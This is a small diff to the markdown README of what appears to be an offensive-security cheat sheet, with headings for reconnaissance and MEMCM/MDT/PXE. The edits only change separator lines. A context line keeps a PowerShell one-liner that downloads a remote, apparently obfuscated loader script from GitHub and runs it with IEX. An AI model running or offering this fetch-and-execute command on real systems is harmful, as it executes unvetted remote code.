@@ -6,15 +6,17 @@ $key need to be set
 IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_LOAD_Menu.ps1')
 ```
 
-------------------------------------------------------------------------------
+*******
 
 # CYBER CHEAT SHEET
 
 ### RECONNAISSANCE - ENUMERATION
+*******
 
 Todo
 
 ### MEMCM - MDT - PXE
+*******
 
 Ressources :
 
